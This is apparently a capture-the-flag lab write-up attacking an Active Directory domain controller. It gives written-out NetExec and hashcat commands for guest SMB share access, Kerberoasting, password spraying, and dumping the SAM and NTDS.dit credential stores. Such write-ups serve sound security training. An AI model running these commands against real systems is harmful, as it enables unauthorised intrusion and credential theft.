---
title: "HackSmarter: Martini"
date: 2026-09-12
excerpt: An adult beverage company "Martini Bars" recently had a corporate breach and the compliance and risk team dictates they perform a penetration test at one of their branch offices. The Hack Smarter team has been authorized to perform an internal black box pentest.
readingTime: 1
tags:
  - Writeup
  - Easy
  - active-directory
  - kerberoasting
  - netexec
author: pir4cy
coverImage: /images/writeups/covers/hacksmarter/hacksmarter-martini-cover.png
draft: false
---

# Martini

## Objective
An adult beverage company "Martini Bars" recently had a corporate breach and the compliance and risk team dictates they perform a penetration test at one of their branch offices. The Hack Smarter team has been authorized to perform an internal black box pentest.

## Initial Access
The client has provided you with VPN access to their internal network, but no credentials.

## Recon

![Nmap Scan](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nmap.png "NMAP")
Looks like a classic DC.

With this, we can edit our hosts file and add DC01.dry.martini.bars as a known host.

## SMB Enumeration

Without credentials, we can start with enumerating the SMB service. If we have null or guest logins enabled, we might be able to get some insight into network shares or users present.

`nxc smb 10.1.44.144 -u '' -p ''`

![SMB Null Login](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-smb-null.png "SMB Null login")

Null login was successful! Let's see if we can enumerate shares:

`nxc smb 10.1.44.144 -u '' -p '' --shares`

![SMB Null Shares](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-smb-shares.png "SMB Null Shares")

We do see some interesting shares, but unfortunately no access. 

Let's try to do the same thing with a guest account:

`nxc smb 10.1.44.144 -u 'a' -p '' --shares`

> if user 'a' exists, the DC will try to authenticate, otherwise it will be considered a guest account.

![SMB Guest Shares](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-smb-guest.png "SMB Guest Shares")

We have `READ,WRITE` permissions for the share `notes`. We can download all available shares by using NetExec's spider_plus module.

`nxc smb 10.1.44.144 -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True`

With that, we can simply enumerate the notes share and see what we find. Lucky for us, user `mprice` left their credentials in the notes.txt file.

![Notes.txt Found](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/notes-share-creds-found.png "Notes.txt found")

## LDAP Enumeration
With valid credentials, we can now start enumerating LDAP and find other potential users as well.

`nxc ldap dc01 -u 'mprice' -p <REDACTED> --users-export users.txt`

![Additional Users](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-ldap-valid-users.png "Additional Users via LDAP")

## Kerberoasting & Hashcat
Since there's a service account in the mix, let's see if this is kerberoastable. 

`nxc ldap dc01 -u 'mprice' -p <REDACTED> --kerberoasting kerberoast.txt`

![Kerberoasting](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-kerberoast-athena_svc.png "Kerberoasting")

We can now crack this with hashcat and hopefully we will get a password:

`hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`

![Haschat 1](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/hashcat-run.png "Hashcat 1")

![Haschat 2](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/hashcat-cracked.png "Hashcat 2")

Let's spray this new password across all users. Password re-use is a common issue:

`nxc winrm dc01 -u users.txt -p <REDACTED> --continue-on-success`

![Password Reuse](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/password-reuse-athenat0.png "Password Reuse")

## Dumping Credentials
We can continue to use NetExec to dump credentials from the host. Since we already have Admin access via the 2 users shown earlier, let's try to dump the SAM and NTDS.dit.

> I tried to dump the SAM and NTDS using athena_svc but it looks like there were some potential controls that prevented the dump from the service account. No worries, though, we have the other user account to grab our loot.

`nxc winrm dc01 -u 'athena.t0' -p <REDACTED> --sam`

![Dumping SAM](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-dump-sam.png "Dumping SAM")

`nxc winrm dc01 -u 'athena.t0' -p <REDACTED> --ntds`

![Dumping NTDS.dit](/images/writeups/machines/hacksmarter/HackSmarter_MartiniAD/nxc-ntds-krbtgt.png "Dumping NTDS.dit")

## Conclusion
This was a nice box that goes to show how small misconfigurations can eventually lead to big problems. Allowing guest logins to access the network share may be justified by the business, but sensitive files with credentials should not be accessible to guests. 
The initial notes file then led to Kerberoasting and password reuse was the final nail in the coffin, completing the compromise.